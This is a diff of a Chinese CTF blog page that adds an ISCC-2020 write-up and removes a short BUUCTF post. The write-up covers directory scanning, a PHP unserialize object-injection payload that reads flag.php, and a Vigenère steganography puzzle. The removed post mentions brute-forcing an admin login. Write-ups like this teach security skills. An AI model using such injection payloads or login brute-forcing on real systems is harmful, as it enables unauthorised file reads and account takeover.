@@ -251,6 +251,173 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/01/ISCC-2020/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="w1ndy">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w1ndy's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/05/01/ISCC-2020/" itemprop="url">ISCC-2020</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-01T16:36:27+08:00">
+                2020-05-01
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-05-03T00:30:58+08:00">
+                2020-05-03
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-Web/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF-Web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="阿森的爱情-1"><a href="#阿森的爱情-1" class="headerlink" title="阿森的爱情-1"></a>阿森的爱情-1</h4><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/web1.jpg" alt=""><br>测试了下SQL注入，没啥反应，源码也啥都没有<br>dirsearch直接扫，在readme.txt中发现flag</p>
+<h4 id="Php-is-the-best-language"><a href="#Php-is-the-best-language" class="headerlink" title="Php is the best language"></a>Php is the best language</h4><p>文件下载下来后，是php代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">@error_reporting(1);</span><br><span class="line">include <span class="string">'flag.php'</span>;</span><br><span class="line">class baby </span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">function</span> __toString()      </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$filename</span> = <span class="string">"./&#123;<span class="variable">$this</span>-&gt;file&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (base64_encode(file_get_contents(<span class="variable">$filename</span>)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">return</span> base64_encode(file_get_contents(<span class="variable">$filename</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'data'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">'data'</span>];</span><br><span class="line">        <span class="variable">$good</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$good</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="string">'./index.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">'test'</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">'test'</span>];</span><br><span class="line">    <span class="variable">$html</span>.=<span class="string">"&lt;p&gt;谢谢参与!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>看见unserialize()就知道考察反序列化<br>在反序列化时会触发__toString(),就可利用该函数读出flag.php文件里的内容<br>exp:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">@error_reporting(1);</span><br><span class="line">include <span class="string">'flag.php'</span>;</span><br><span class="line">class baby </span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">function</span> __toString()      </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$filename</span> = <span class="string">"./&#123;<span class="variable">$this</span>-&gt;file&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (base64_encode(file_get_contents(<span class="variable">$filename</span>)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">return</span> base64_encode(file_get_contents(<span class="variable">$filename</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="variable">$good</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$good</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>payload:?data=O:4:”baby”:1:{s:4:”file”;s:8:”flag.php”;}<br>界面打印出一段base64编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgJGE9J2ZsYWd7dV9yX3JlYWxseV9hX3BocF9leHBlcnR9Jzs/Pg0K</span><br></pre></td></tr></table></figure>
+<p>解密后</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="variable">$a</span>=<span class="string">'flag&#123;u_r_really_a_php_expert&#125;'</span>;?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><p>吐槽一下：签到题还整个坑，出题人也是够了<br>一张图片，名字是high.png,第一反应修改图片高度，果然在图片底部隐藏有信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCC&#123;D3tivtm_zv_Tq5I_Dygef&#125;</span><br></pre></td></tr></table></figure>
+<p>提交发现不对，去掉ISCC和括号也不对，变成小写iscc也不对，前缀改成flag还是不对，群里的大佬纷纷讨论，是不是题目有问题，客服来了句这道题有坑，直接了<br>一套子图片隐写工具下来没啥发现，就回到了隐藏信息上<br>想了好久，试了好几种加密方式，最后突发奇想可能是维吉尼亚密码，密钥也试了好几种，差点就觉得不是维吉尼亚密码了<br>突然想到high可能是密码，然后就解出来了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BKWV&#123;W3lcome_to_Mi5C_Wryyy&#125;</span><br></pre></td></tr></table></figure>
+<p>把前缀换成ISCC就可了</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -556,169 +723,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/14/BUUCTF-Web/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="w1ndy">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="w1ndy's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/03/14/BUUCTF-Web/" itemprop="url">BUUCTF-Web</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-14T17:13:19+08:00">
-                2020-03-14
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">更新于&#58;</span>
-              
-              <time title="更新于" itemprop="dateModified" datetime="2020-04-03T14:14:25+08:00">
-                2020-04-03
-              </time>
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF-Web/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF-Web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p><img src="http://q63cs67co.bkt.clouddn.com/buuctf_login_1.PNG" alt=""><br>一个登陆框，登录名应该是admin，直接爆破<br>密码爆破后为123<br>登陆成功，拿到flag</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/03/14/BUUCTF-Web/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/">&lt;prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/3/">next&gt;</a>
+    <a class="extend prev" rel="prev" href="/">&lt;prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/3/">next&gt;</a>
   </nav>
 
 
@@ -768,7 +777,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
